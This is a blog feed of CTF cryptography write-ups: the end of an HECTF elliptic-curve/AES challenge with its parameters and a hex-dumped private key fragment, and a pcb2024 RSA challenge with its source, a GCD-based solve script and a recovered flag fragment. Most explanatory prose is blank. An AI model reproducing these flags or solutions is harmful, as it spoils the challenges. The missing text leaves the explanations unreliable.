class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(y2,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y2,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">                yp = <span class="built_in">pow</span>(y2,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">                yq = <span class="built_in">pow</span>(y2,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">                _,s,t = gcdext(p,q)</span><br><span class="line">                y2 = (s*p*yq + t*q*yp) % n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    Ep = Curve(<span class="literal">None</span>, p, a, <span class="number">0</span>, <span class="literal">None</span>, x1, y1) </span><br><span class="line">    En = Curve(<span class="literal">None</span>, n, a, b, <span class="literal">None</span>, x2, y2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line">    hint1 = key * Ep.G</span><br><span class="line">    hint = [x1 ,hint1]</span><br><span class="line">    <span class="keyword">return</span> En, hint</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_encrypt</span>(<span class="params">m, G, k</span>):</span><br><span class="line">    blocks = [m[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m) // <span class="number">16</span>)]</span><br><span class="line">    ciph = []</span><br><span class="line">    aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        c = aes.encrypt(blocks[i])</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            G = G + G</span><br><span class="line">            ciph.append(G.x ^ bytes_to_long(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciph.append(G.y ^ bytes_to_long(c))</span><br><span class="line">    <span class="keyword">return</span> ciph               </span><br><span class="line"></span><br><span class="line">flag = secret.flag</span><br><span class="line">key = secret.key</span><br><span class="line"></span><br><span class="line">m = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ m+ <span class="string">b&#x27;&#125;&#x27;</span> == flag</span><br><span class="line">A, hint = A_function(key)</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">c = A_encrypt(m, A.G,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint =&quot;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line"><span class="string">q = 7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line"><span class="string">a = 4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line"><span class="string">b = 5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line"><span class="string">hint = [5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403, </span></span><br><span class="line"><span class="string">        X: 0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line"><span class="string">        Y: 0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line"><span class="string">        (On curve &lt;None&gt;)]</span></span><br><span class="line"><span class="string">c = [36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820, 20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332, 19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277, 45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>QWQ</p><h3 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsa160d0a</span><br><span class="line">1</span><br><span class="line"> hint1:  PKCS1_OAEP  cipher.decrypt() </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100</span><br><span class="line">d48d90d80f02818051a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf0281800fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd02818025c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure><p><code>c</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0d</span><br></pre></td></tr></table></figure><p><a href="https://tover.xyz/p/pem-by-hand/"></a><br /></p><p>(?)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#&quot;&gt;&lt;/a&gt; &lt;/h1&gt;
&lt;p&gt;&lt;code&gt;web&lt;/code&gt;(&lt;code&gt;pwn&lt;/code&gt;)</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pcb2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/</id>
    <published>2024-11-10T09:25:26.000Z</published>
    <updated>2025-08-26T09:27:33.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="solved"><a class="markdownIt-Anchor" href="#solved"></a> SOLVED</h2><h3 id="babyenc-pcb2024"><a class="markdownIt-Anchor" href="#babyenc-pcb2024"></a> babyenc-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag2.encode())</span><br><span class="line">m1 = bytes_to_long(flag1.encode())</span><br><span class="line">m2 = bytes_to_long(flag2.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_gen</span>(<span class="params">bits</span>):</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e.append(getPrime(bits))</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc1</span>(<span class="params">m, e, shift</span>):</span><br><span class="line">    n = next_prime(m &lt;&lt; shift)</span><br><span class="line">    tmp = getPrime(<span class="number">256</span>)</span><br><span class="line">    cc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        cc.append(<span class="built_in">int</span>(<span class="built_in">pow</span>(tmp, e[i], n)))</span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits)</span><br><span class="line">    q = getPrime(nbits)</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>(<span class="params">m, p, q, n</span>):</span><br><span class="line">    c = [<span class="built_in">pow</span>(m, p, n),<span class="built_in">pow</span>(m, q, n)]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">bits = <span class="number">6</span></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">e = e_gen(bits)</span><br><span class="line">shift = <span class="number">310</span></span><br><span class="line">c1 = enc1(m1,e,shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line">p, q = key_gen(nbits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c2 = enc2(m2, p, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="string">c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]</span></span><br><span class="line"><span class="string">n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"><span class="string">c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>flag1</code><strong></strong><code>n</code><code>n</code>()<br /><a href="https://tangcuxiaojikuai.xyz/post/9c1c22d0.html">https://tangcuxiaojikuai.xyz/post/9c1c22d0.html</a><strong>Middle_RSA2</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo></mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1\equiv m^{e1}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo></mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2\equiv m^{e2}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mo></mo><mi>e</mi><mn>2</mn></mrow></msup><mo></mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mo></mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{-e2}*c2^{e1}\equiv 1mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>e</mi><mn>2</mn></mrow></msup><mo></mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{e2}\equiv c2^{e1}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>e</mi><mn>2</mn></mrow></msup><mo></mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mo>=</mo><mi>k</mi><mo></mo><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{e2}-c2^{e1}=k*n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>C</mi><mi>D</mi><mtext></mtext><mi>n</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">GCDn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = [<span class="number">43</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">59</span>]</span><br><span class="line">c1 = [<span class="number">304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117</span>, <span class="number">300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224</span>,</span><br><span class="line">      <span class="number">294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531</span>, <span class="number">255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835</span>, <span class="number">194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span>]</span><br><span class="line">k1_n = c1[<span class="number">0</span>]**e[<span class="number">1</span>]-c1[<span class="number">1</span>]**e[<span class="number">0</span>]</span><br><span class="line">k2_n = c1[<span class="number">1</span>]**e[<span class="number">2</span>]-c1[<span class="number">2</span>]**e[<span class="number">1</span>]</span><br><span class="line">n = GCD(k1_n, k2_n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(n &gt;&gt; <span class="number">310</span>).decode())</span><br><span class="line"><span class="comment"># flag&#123;3e99c26b-efdd-4c</span></span><br></pre></td></tr></table></figure><p><code>flag2</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo></mo><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c2[0]\equiv m(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo></mo><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c2[1]\equiv m(mod\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><br /><a href="https://blog.csdn.net/shshss64/article/details/130036481"></a></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mn>1</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><msup><mo stretchy="false">]</mo><mi>n</mi></msup><mo></mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><msup><mo stretchy="false">]</mo><msup><mi>p</mi><mn>2</mn></msup></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2[0]^{n}\equiv c2[1]^{p^{2}}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 